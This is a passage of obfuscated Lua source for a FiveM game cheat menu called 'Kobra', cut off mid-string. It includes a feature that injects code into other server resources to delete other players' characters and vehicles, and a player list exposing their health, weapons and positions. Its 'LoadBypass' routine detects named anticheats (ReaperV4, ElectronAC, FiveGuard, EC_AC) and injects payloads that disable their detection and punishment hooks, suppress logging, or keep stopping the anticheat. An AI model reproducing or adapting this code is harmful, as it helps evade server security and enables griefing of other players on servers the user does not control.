ipairs(v1446) do if IsVehicleSeatFree(v1445,v1490) then return v1490;end end return  -(955 -(919 + 35));end local v1374=PlayerPedId();local v1375=GetEntityCoords(v1374);local v1376=GetCamCoord(_G.KobraFreecamObject);local v1377=GetCamRot(_G.KobraFreecamObject,2 + 0 );local v1378=v1373(v1377);local v1379=4035 -3035 ;local v1380=v1376 + (v1378 * v1379) ;local v1381=StartShapeTestRay(v1376.x,v1376.y,v1376.z,v1380.x,v1380.y,v1380.z, -(468 -(369 + 98)),v1374,0);local v1382,v1383,v1384,v1382,v1385=GetShapeTestResult(v1381);local function v1386(v1447) if ( not v1447 or  not DoesEntityExist(v1447)) then return;end local v1448=GetPedInVehicleSeat(v1447, -1);if ((v1448~=(1115 -(400 + 715))) and DoesEntityExist(v1448)) then local v1535=0 + 0 ;while true do if (v1535==(2 + 1)) then Wait(1575 -(744 + 581) );SetPedIntoVehicle(v1374,v1447, -(1 + 0));break;end if (v1535==(1624 -(653 + 969))) then Wait(1);SetPedIntoVehicle(v1374,v1447, -(1 -0));Wait(2081 -(12 + 1619) );ClearPedTasksImmediately(v1374);v1535=166 -(103 + 60) ;end if (v1535==(4 -3)) then Wait(40);SetPedIntoVehicle(v1374,v1447, -(4 -3));Wait(4 -3 );SetPedIntoVehicle(v1374,v1447,GetEmptySeat(v1447));v1535=1664 -(710 + 952) ;end if ((1868 -(555 + 1313))==v1535) then SetPedIntoVehicle(v1374,v1447,0);v1372(v1447,2000);Wait(10 + 0 );for v1627=0,4 + 0  do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1448   .. [[)
                                        ]] );end v1535=1 + 0 ;end end end end CreateThread(function() if v1383 then if ((v1385~=0) and IsEntityAVehicle(v1385)) then local v1583=1468 -(1261 + 207) ;local v1584;while true do if (v1583==(252 -(245 + 7))) then v1584=v1385;v1386(v1584);break;end end end end end);end elseif (v824=="Delete Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1387=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v48(v1387,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function DeleteCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                else
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                    Wait(100)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        DeleteCar(vehicle)
                                    end
                                end
                            end)
                        ]]);elseif _G.KobraFreecamObject then local v1491=747 -(212 + 535) ;local v1492;local v1493;local v1494;local v1495;local v1496;local v1497;local v1498;local v1499;local v1500;local v1501;local v1502;local v1503;local v1504;local v1505;local v1506;while true do if (v1491==(39 -31)) then v1502,v1503,v1504,v1502,v1505=GetShapeTestResult(v1501);v1506=nil;function v1506(v1587) local v1588=1476 -(905 + 571) ;local v1589;while true do if (v1588==1) then if ((v1589~=0) and DoesEntityExist(v1589)) then local v1653=0 -0 ;while true do if ((0 -0)==v1653) then SetPedIntoVehicle(v1494,v1587,0 -0 );v1492(v1587,15 + 1985 );Wait(10);v1653=1464 -(522 + 941) ;end if (v1653==(1512 -(292 + 1219))) then for v1666=1112 -(787 + 325) ,11 -7  do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1589   .. [[)
                                        ]] );end Wait(40);SetPedIntoVehicle(v1494,v1587, -1);v1653=2 + 0 ;end if (v1653==3) then SetPedIntoVehicle(v1494,v1587, -(2 -1));Wait(450);ClearPedTasksImmediately(v1494);v1653=538 -(424 + 110) ;end if (v1653==(2 + 0)) then Wait(1 + 0 );SetPedIntoVehicle(v1494,v1587,GetEmptySeat(v1587));Wait(1 + 0 );v1653=315 -(33 + 279) ;end if (v1653==(1 + 3)) then SetEntityCoordsNoOffset(v1494,v1495.x,v1495.y,v1495.z,true,true,true,true);Wait(1453 -(1338 + 15) );MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1587   .. [[)
                                    ]] );break;end end else SetPedIntoVehicle(v1494,v1587, -(1424 -(528 + 895)));Wait(48 + 52 );MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1587   .. [[)
                                    ]] );Wait(2024 -(1606 + 318) );SetEntityCoordsNoOffset(v1494,v1495.x,v1495.y,v1495.z,true,true,true,true);end break;end if (v1588==0) then if ( not v1587 or  not DoesEntityExist(v1587)) then return;end v1589=GetPedInVehicleSeat(v1587, -(1820 -(298 + 1521)));v1588=1;end end end CreateThread(function() if v1503 then if ((v1505~=(0 -0)) and IsEntityAVehicle(v1505)) then local v1647=310 -(154 + 156) ;local v1648;while true do if ((0 -0)==v1647) then v1648=v1505;v1506(v1648);break;end end end end end);break;end if (v1491==(3 -1)) then hNative("GetShapeTestResult",function(v1590,...) return v1590(...);end);hNative("GetPedInVehicleSeat",function(v1591,...) return v1591(...);end);hNative("SetEntityVisible",function(v1592,...) return v1592(...);end);hNative("DeletePed",function(v1593,...) return v1593(...);end);v1491=3;end if (v1491==(1121 -(712 + 403))) then v1494=PlayerPedId();v1495=GetEntityCoords(v1494);v1496=GetCamCoord(_G.KobraFreecamObject);v1497=GetCamRot(_G.KobraFreecamObject,2);v1491=7;end if (v1491==(451 -(168 + 282))) then hNative("GetEntityCoords",function(v1594,...) return v1594(...);end);hNative("GetCamCoord",function(v1595,...) return v1595(...);end);hNative("GetCamRot",function(v1596,...) return v1596(...);end);hNative("StartShapeTestRay",function(v1597,...) return v1597(...);end);v1491=2;end if (v1491==(0 -0)) then function hNative(v1598,v1599) local v1600=0 + 0 ;local v1601;while true do if (v1600==(0 + 0)) then v1601=_G[v1598];if ( not v1601 or (type(v1601)~="function")) then return;end v1600=2 -1 ;end if (1==v1600) then _G[v1598]=function(...) return v1599(v1601,...);end;break;end end end hNative("CreateThread",function(v1602,...) return v1602(...);end);hNative("Wait",function(v1603,...) return v1603(...);end);hNative("DoesEntityExist",function(v1604,...) return v1604(...);end);v1491=1452 -(1242 + 209) ;end if (v1491==7) then v1498=v1493(v1497);v1499=1679 -(20 + 659) ;v1500=v1496 + (v1498 * v1499) ;v1501=StartShapeTestRay(v1496.x,v1496.y,v1496.z,v1500.x,v1500.y,v1500.z, -(1 + 0),v1494,0);v1491=8;end if (v1491==(3 + 1)) then hNative("PlayerPedId",function(v1605,...) return v1605(...);end);hNative("NetworkRequestControlOfEntity",function(v1606,...) return v1606(...);end);hNative("NetworkHasControlOfEntity",function(v1607,...) return v1607(...);end);v1492=nil;v1491=7 -2 ;end if (v1491==(6 -3)) then hNative("ClearPedTasksImmediately",function(v1608,...) return v1608(...);end);hNative("SetEntityCoordsNoOffset",function(v1609,...) return v1609(...);end);hNative("IsEntityAVehicle",function(v1610,...) return v1610(...);end);hNative("SetPedIntoVehicle",function(v1611,...) return v1611(...);end);v1491=623 -(427 + 192) ;end if (v1491==(11 -6)) then function v1492(v1612,v1613) v1613=v1613 or (740 + 1260) ;local v1614=GetGameTimer();while (GetGameTimer() -v1614)<v1613  do local v1628=1947 -(1427 + 520) ;while true do if ((0 + 0)==v1628) then if NetworkHasControlOfEntity(v1612) then return true;end NetworkRequestControlOfEntity(v1612);v1628=1;end if (v1628==1) then Wait(0);break;end end end return NetworkHasControlOfEntity(v1612);end v1493=nil;function v1493(v1615) local v1616=0;local v1617;local v1618;local v1619;while true do if (v1616==0) then v1617=math.rad(v1615.z);v1618=math.rad(v1615.x);v1616=3 -2 ;end if (v1616==1) then v1619=math.abs(math.cos(v1618));return vector3( -math.sin(v1617) * v1619 ,math.cos(v1617) * v1619 ,math.sin(v1618));end end end function GetEmptySeat(v1620) local v1621={ -(1233 -(712 + 520)),0,566 -(35 + 530) ,1 + 1 };for v1629,v1630 in ipairs(v1621) do if IsVehicleSeatFree(v1620,v1630) then return v1630;end end return  -1;end v1491=6;end end end end end end local v481=v17[v15];if v481 then if ((v481.type=="slider") or (v481.type=="slider-checkbox")) then local v825=v481.max or (355 -255) ;local v826=GetGameTimer();if (v825<=(1388 -(1330 + 48))) then if (IsControlPressed(0 + 0 ,31 + 143 ) and ((v826-v296)>v297)) then v12:ScrollTwo("Left");v296=v826;elseif (IsControlPressed(0,175) and ((v826-v296)>v297)) then local v1201=0 -0 ;while true do if (v1201==(0 -0)) then v12:ScrollTwo("Right");v296=v826;break;end end end elseif IsControlPressed(0,1343 -(854 + 315) ) then v12:ScrollTwo("Left");elseif IsControlPressed(0,560 -385 ) then v12:ScrollTwo("Right");end end end end end);local v102=0 + 0 ;local v103=164 -(31 + 13) ;local v104=0 -0 ;local v105=278 -158 ;local v106=0 + 0 ;local v107=683 -(281 + 282) ;MachoOnKeyDown(function(v298) local v299=tonumber(v298) or v298 ;local v300=v44[v299] or "Unknown" ;local v301=GetGameTimer();if (v300==v23) then if ( not v13 and v24) then v12:ShowUI();end elseif (v300=="Backspace") then if (v13 and v24) then v12:Backspace();end elseif (v300=="Enter") then if (v13 and v24) then v12:Enter();end elseif ((v300=="Q") and ((v301-v106)>v107)) then if (v13 and v24) then v12:PrevCategory();end elseif ((v300=="E") and ((v301-v106)>v107)) then if (v13 and v24) then v12:NextCategory();end elseif ((v300=="ArrowUp") and ((v301-v102)>v103)) then if v13 then v12:ScrollOne("Up");v102=v301;end elseif ((v300=="ArrowDown") and ((v301-v102)>v103)) then if v13 then v12:ScrollOne("Down");v102=v301;end elseif (v300=="ArrowLeft") then local v1449=0 -0 ;local v1450;while true do if (v1449==(0 + 0)) then v1450=v17[v15];if v1450 then if ((v1450.type=="slider") or ((v1450.type=="slider-checkbox") and ((v301-v104)>v105))) then local v1632=949 -(216 + 733) ;local v1633;local v1634;while true do if (v1632==(1847 -(137 + 1710))) then v1633=v1450.max or 100 ;v1634=GetGameTimer();v1632=1;end if (v1632==1) then if (v1633<=(27 -17)) then local v1659=538 -(100 + 438) ;while true do if (v1659==(1365 -(205 + 1160))) then v12:ScrollTwo("Left");v104=v1634;break;end end else v12:ScrollTwo("Left");end break;end end elseif ((v1450.type=="scrollable") or (v1450.type=="scrollable-checkbox")) then v12:ScrollTwo("Left");end end break;end end elseif (v300=="ArrowRight") then local v1536=0 + 0 ;local v1537;while true do if (v1536==(0 + 0)) then v1537=v17[v15];if v1537 then if ((v1537.type=="slider") or ((v1537.type=="slider-checkbox") and ((v301-v104)>v105))) then local v1649=v1537.max or 100 ;local v1650=GetGameTimer();if (v1649<=10) then local v1654=1305 -(535 + 770) ;while true do if (v1654==(0 + 0)) then v12:ScrollTwo("Right");v104=v1650;break;end end else v12:ScrollTwo("Right");end elseif ((v1537.type=="scrollable") or (v1537.type=="scrollable-checkbox")) then v12:ScrollTwo("Right");end end break;end end elseif (v300=="F5") then local v1585=0 + 0 ;local v1586;while true do if ((1994 -(211 + 1783))==v1585) then v1586=v17[v15];if (v13 and v24 and v1586 and ((v1586.type=="button") or (v1586.type=="checkbox") or (v1586.type=="slider-checkbox"))) then local v1651=0 + 0 ;while true do if (v1651==(1430 -(1236 + 193))) then v60(("Bind %s"):format(v1586.label),"",function(v1662) for v1667,v1668 in pairs(v44) do if (v1668:lower()==v1662:lower()) then local v1670=0;local v1671;while true do if (v1670==2) then v12:ShowUI();return;end if (v1670==(911 -(793 + 117))) then if v1671 then v25[ #v25 + (1893 -(1607 + 285)) ]={key=v1671,keyRaw=v1667,keyLabel=v44[v1667],type=v1586.type,label=v1586.label,checked=v1586.checked or false ,value=v1586.value or (861 -(747 + 113)) ,step=v1586.step or (1976.25 -(80 + 1896)) ,min=v1586.min or (0.25 -0) ,max=v1586.max or (8 -3) ,onSelect=v1586.onSelect};v12:ShowKeybindList(v25);end Wait(469 + 31 );v1670=2;end if (v1670==(0 -0)) then v1671=v45[v1667];for v1676,v1677 in pairs(v25) do if (v1677.keyRaw==v1667) then v12:Notify("error","Kobra","There is already a keybind with that key!",1585 + 1415 );return;end end v1670=2 -1 ;end end end end end,"keybind");break;end if (v1651==(0 + 0)) then v12:HideUI();Wait(250);v1651=1 + 0 ;end end end break;end end elseif v24 then for v1636,v1637 in pairs(v25) do if (v1637.type=="button") then local v1652=v1637.keyRaw;if v1652 then if (v1652==v299) then local v1663=0 -0 ;while true do if (v1663==(454 -(246 + 208))) then v1637.onSelect();v12:Notify("success","Kobra",("You have executed %s!"):format(v1637.label),4892 -(614 + 1278) );break;end end end end elseif (v1637.type=="checkbox") then local v1655=0;local v1656;while true do if (v1655==(0 + 0)) then v1656=v1637.keyRaw;if (v1656 and (v1656==v299)) then v1637.checked= not v1637.checked;v12:UpdateTabChecked(v16,v1637.label,v1637.checked);if v1637.onSelect then v1637.onSelect(v1637.checked);end v12:ShowKeybindList(v25);v12:Notify((v1637.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1637.checked and "enabled") or "disabled" ,v1637.label),3314 -(249 + 65) );if v13 then v12:UpdateElements(v17);end end break;end end elseif (v1637.type=="slider-checkbox") then local v1664=0;local v1665;while true do if (v1664==(0 -0)) then v1665=v1637.keyRaw;if (v1665 and (v1665==v299)) then local v1674=1275 -(726 + 549) ;while true do if (v1674==2) then v12:Notify((v1637.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1637.checked and "enabled") or "disabled" ,v1637.label),3000);if v13 then v12:UpdateElements(v17);end break;end if (v1674==(1 + 0)) then if v1637.onSelect then v1637.onSelect(v1637.value,v1637.checked);end v12:ShowKeybindList(v25);v1674=1426 -(916 + 508) ;end if (v1674==(0 -0)) then v1637.checked= not v1637.checked;v12:UpdateTabChecked(v16,v1637.label,v1637.checked);v1674=1;end end end break;end end end end end end);v12.InListMenu=function(v302) return v18 and v18[v19] and ((v18[v19].label=="List") or (v18[v19].label=="Safe")) ;end;v12.SelectEveryone=function(v303) if ( not v18 or  not v18[v19]) then return;end local v304=v18[v19];if (v304.label~="List") then return;end for v482,v483 in ipairs(v304.tabs) do if (v483.type=="checkbox") then v483.checked=true;if (v483.serverId and tonumber(v483.serverId)) then v27[tonumber(v483.serverId)]=true;end end end v303:UpdateElements(v17);end;v12.UnselectEveryone=function(v305) local v306=0 + 0 ;local v307;while true do if (v306==2) then v305:UpdateElements(v17);break;end if (v306==(323 -(140 + 183))) then if ( not v18 or  not v18[v19]) then return;end v307=v18[v19];v306=1;end if (v306==1) then if (v307.label~="List") then return;end for v757,v758 in ipairs(v307.tabs) do if (v758.type=="checkbox") then local v868=0;while true do if (v868==(0 + 0)) then v758.checked=false;if (v758.serverId and tonumber(v758.serverId)) then v27[tonumber(v758.serverId)]=false;end break;end end end end v306=566 -(297 + 267) ;end end end;v12.ClearSelection=function(v308) v27={};if (v18 and v18[v19]) then local v577=0 + 0 ;local v578;while true do if (v577==(342 -(37 + 305))) then v578=v18[v19];if ((v578.label=="List") and v578.tabs) then for v1012,v1013 in ipairs(v578.tabs) do if (v1013.type=="checkbox") then v1013.checked=false;end end end break;end end end v12:UnselectEveryone();end;v12.UpdateListMenu=function(v309) if  not v13 then return;end if ( not v18 or  not v18[v19]) then return;end local v310=v18[v19];if (v310.label~="List") then return;end local v311=GetEntityCoords(PlayerPedId());if  not v311 then return;end local v312=v309:GetNearbyPlayers(v311,1616 -(323 + 943) ,true);local v313;for v484,v485 in ipairs(v310.tabs) do if ((v485.type=="divider") and (v485.label=="Nearby Players")) then v313=v484;break;end end if  not v313 then return;end for v486= #v310.tabs,v313 + 1 , -1 do table.remove(v310.tabs,v486);end if ( #v312==0) then v310.tabs[ #v310.tabs + 1 + 0 ]={type="button",label="No Nearby Players",disabled=true};else table.sort(v312,function(v657,v658) return tonumber(v657.serverId)<tonumber(v658.serverId) ;end);for v659,v660 in ipairs(v312) do local v661=tonumber(v660.serverId);if (v661 and v660.name) then local v829,v830=GetCurrentPedWeapon(GetPlayerPed(GetPlayerFromServerId(v661)));v310.tabs[ #v310.tabs + (1 -0) ]={type="checkbox",label=("%s - [%s]"):format(v660.name,v661),serverId=v661,checked=v27[v661] or false ,name=v660.name,vehicle=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v661)))~=(1535 -(394 + 1141))) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v661)))) or nil ,isDriver=(GetPedInVehicleSeat((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v661)))~=(0 + 0)) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v661))) , -(1 + 0))==GetPlayerPed(GetPlayerFromServerId(v661))) or false ,metaData={{key="Distance",value=math.floor( #(GetEntityCoords(PlayerPedId()) -GetEntityCoords(GetPlayerPed(GetPlayerFromServerId(v661)))))   .. ".0m" },{key="Server ID",value=v661},{key="Health",value=GetEntityHealth(GetPlayerPed(GetPlayerFromServerId(v661))),color="0, 255, 17"},{key="Armour",value=GetPedArmour(GetPlayerPed(GetPlayerFromServerId(v661))),color="0, 132, 255"},{key="Weapon",value=v28[v830] or "Unknown" },{key="Vehicle",value=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v661)))~=(0 + 0)) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v661)))) or "Unknown" },{key="Alive",value=(IsPedDeadOrDying(GetPlayerPed(GetPlayerFromServerId(v661))) and "Dead") or "Alive" },{key="Speed",value=math.floor(GetEntitySpeed(GetPlayerPed(GetPlayerFromServerId(v661))) * (3.6 + 0) )   .. ".0 km/h" },{key="Visible",value=(IsEntityVisibleToScript(GetPlayerPed(GetPlayerFromServerId(v661))) and "Visible") or "Invisible" }},onSelect=function(v869) v27[v661]=v869 or false ;end};end end end for v487,v488 in pairs(v27) do local v489=false;for v580,v581 in ipairs(v312) do if (tonumber(v581.serverId)==tonumber(v487)) then v489=true;break;end end if  not v489 then v27[v487]=nil;end end v15=math.min(v15 or (1 + 0) ,math.max(1 + 0 , #v310.tabs));local v314,v315=pcall(function() v309:UpdateElements(v17);end);if  not v314 then print("^7[^5Kobra^7]: UI update error: "   .. tostring(v315) );end end;v12.AssignListMenuActions=function(v316) if  not v16 then return;end for v490,v491 in ipairs(v16) do if ((v491.label=="Server") and v491.categories) then for v759,v760 in ipairs(v491.categories) do if ((v760.label=="List") and v760.tabs) then for v963,v964 in ipairs(v760.tabs) do if (v964.type=="button") then if (v964.label=="Select Everyone") then v964.onSelect=function() v12:SelectEveryone();end;elseif (v964.label=="Un-Select Everyone") then v964.onSelect=function() v12:UnselectEveryone();end;elseif (v964.label=="Clear Selection") then v964.onSelect=function() v12:ClearSelection();end;end end end end end end end end;CreateThread(function() while true do Wait(3365 -(1231 + 634) );if (v12:InListMenu() and v13) then local v663,v664=pcall(function() v12:UpdateListMenu();end);if  not v663 then print("^7[^5Kobra^7]: List update error: "   .. tostring(v664) );end end end end);Wait(2766 -(1362 + 404) );v12:AssignListMenuActions();local v114=nil;local v115=nil;local function v116() for v492=0 -0 ,GetNumResources() -(1 + 0)  do local v493=GetResourceByFindIndex(v492);local v494=LoadResourceFile(v493,"fxmanifest.lua");if (v494 and (string.find(v494,"https://electron-services.com") or string.find(v494,"Electron Services") or string.find(v494,"The most advanced fiveM anticheat"))) then v114=v493;print("^7[^5Kobra^7]: Detected ElectronAC in Resource: "   .. v493 );return v493;end end return nil;end local function v117() local v317=0 -0 ;while true do if (v317==0) then for v761=1016 -(660 + 356) ,GetNumResources() -(1 -0)  do local v762=GetResourceByFindIndex(v761);local v763=GetNumResourceMetadata(v762,"client_script");for v832=0 + 0 ,v763-(1951 -(1111 + 839))  do local v833=951 -(496 + 455) ;local v834;while true do if (v833==0) then v834=GetResourceMetadata(v762,"client_script",v832);if (v834 and string.find(v834,"obfuscated")) then local v1121=698 -(66 + 632) ;while true do if (v1121==0) then v115=v762;print("^7[^5Kobra^7]: Detected FiveGuard in Resource: "   .. v762 );v1121=1 -0 ;end if (v1121==(1137 -(441 + 695))) then return v762;end end end break;end end end end return nil;end end end v12.LoadBypass=function(v318) local v319=0;local v320;local v321;while true do if (v319==(2 -1)) then for v764,v765 in ipairs(v320) do if (v321==v765) then v318:Notify("error","Kobra","Bypass disabled for this server.",5626 -2626 );return;end end v318:Notify("info","Kobra","Loading Anticheat Bypass...",14304 -11304 );v319=2 + 0 ;end if (v319==(1842 -(286 + 1552))) then if (GetResourceState("WaveShield")=="started") then v12:Notify("error","Kobra","WaveShield Anticheat Found.",4277 -(1016 + 261) );elseif (GetResourceState("ReaperV4")=="started") then v12:Notify("error","Kobra","ReaperV4 Anticheat Found.",4320 -(708 + 612) );elseif (GetResourceState("ElectronAC")=="started") then v12:Notify("error","Kobra","ElectronAC Anticheat Found.",3000);elseif (GetResourceState("FiniAC")=="started") then v12:Notify("error","Kobra","FiniAC Anticheat Found.",8330 -5330 );end break;end if (v319==(0 + 0)) then v320={"216.146.24.88:30120","91.190.154.74:30120"};v321=GetCurrentServerEndpoint();v319=1;end if (v319==(1173 -(979 + 191))) then Wait(1772 -772 );if (GetResourceState("ReaperV4")=="started") then local v835=1735 -(339 + 1396) ;while true do if ((0 + 0)==v835) then MachoInjectResource2(2 + 0 ,"ReaperV4",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local reaper_newdetection
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "Reaper:NewDetection" then
                        reaper_newdetection = func
                    end
                end
                if type(reaper_newdetection) ~= "function" then
                    return print("error")
                end
                local _, securityclient = debug.getupvalue(reaper_newdetection, 1)
                for name, detection in pairs(securityclient["detections"]) do
                    if detection["detected"] then
                        securityclient["detections"][name]["detected"] = function(...)
                            local args = { ... }
                            print(name, "detected", json.encode(args or {}))
                            return
                        end
                    end
                    if detection["callback"] then
                        securityclient["detections"][name]["callback"] = function(...)
                            local args = { ... }
                            print(name, "callback", json.encode(args or {}))
                            return
                        end
                    end
                end
                for name, detection in pairs(securityclient["active_detections"]) do
                    if detection["detected"] then
                        securityclient["active_detections"][name]["detected"] = function(...) return end
                    end
                    if detection["callback"] then
                        securityclient["active_detections"][name]["callback"] = function(...) return end
                    end
                end
                Debug.setupvalue(reaper_newdetection, 1, securityclient)
                print("ReaperV4 | Client Bypassed")
            end)
        ]]);MachoHookNative(14327026000000000000 -0 ,function(...) return false,false;end);v835=1 + 0 ;end if (v835==(1 + 1)) then MachoHookNative(15349248000000000000,function(...) return false,347 -(187 + 160) ;end);MachoHookNative(18127728000000000000,function(...) return false,true;end);v835=3;end if ((6 -3)==v835) then print("ReaperV4 Bypass Enabled");v318:Notify("info","Kobra","ReaperV4 Bypass Loaded",3000);break;end if (v835==1) then MachoHookNative(10181871000000000000,function(...) return false,9 -6 ;end);MachoHookNative(12777102000000000000,function(...) return false,true;end);v835=2;end end elseif (v114~=nil) then v48("ElectronAC",[[
            print = function() end
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (string.find(msg, "DEBUG") or string.find(msg, "NEWDBG") or string.find(msg, "A11AXXX") or string.find(msg, "function") or string.find(msg, "TriggerServerEvent")) then
                    originalTrace(msg)
                end
            end
        ]]);MachoInjectResource2(2,"ElectronAC",[[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local eAcVerify
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "ElectronAC.verify" then
                        local upname, func = debug.getupvalue(func, 1)
                        eAcVerify = func
                    end
                end
                local EACTable = nil
                local eacUpvalueIndex = nil
                local i = 1
                while true do
                    local name, value = debug.getupvalue(eAcVerify, i)
                    if not name then break end
                    if type(value) == "table" then
                        local hasEACStructure = false
                        for idx, tbl in pairs(value) do
                            if type(tbl) == "string" then
                                if tbl == "antiNuiBlocker" or tbl == "antiInvisible" then
                                    hasEACStructure = true
                                end
                                if hasEACStructure then break end
                            end
                        end
                        if hasEACStructure then
                            EACTable = value
                            eacUpvalueIndex = i
                            break
                        end
                    end
                    i = i + 1
                end
                if not EACTable then
                    print("EAC table not found!")
                    return
                end
                local punish = function(...) return end
                for idx, tbl in pairs(EACTable) do
                    if type(tbl) == "table" then
                        for subIdx, subTbl in pairs(tbl) do
                            if type(subTbl) == "table" and type(subTbl["punish"]) == "function" and subTbl["punish"] then
                                subTbl["punish"] = punish
                            end
                        end
                    end
                end
                Debug.setupvalue(eAcVerify, eacUpvalueIndex, EACTable)
                print("ElectronAC | Client Bypassed")
            end)
        ]]);elseif (v115~=nil) then local v1085=0 + 0 ;while true do if (v1085==0) then CreateThread(function() while true do MachoResourceStop(v115);print("^7[^5Kobra^7]: Stopped Resource: "   .. v115 );Wait(2000);end end);return;end end elseif (GetResourceState("EC_AC")=="started") then local v1204=0 -0 ;local v1205;while true do if (v1204==0) then MachoInjectResourceRaw("EC_AC",[[print = function() end]]);MachoInjectResourceRaw("EC_AC",[[
            local originalTrace = Citizen.Trace
            Citizen.Trace = function(msg)
                if not (
                    string.find(msg, "DEBUG") or
                    string.find(msg, "NEWDBG") or
                    string.find(msg, "A11AXXX") or
                    string.find(msg, "function") or
                    string.find(msg, "TriggerServerEvent")
                ) then
                    originalTrace(msg)
                end
            end
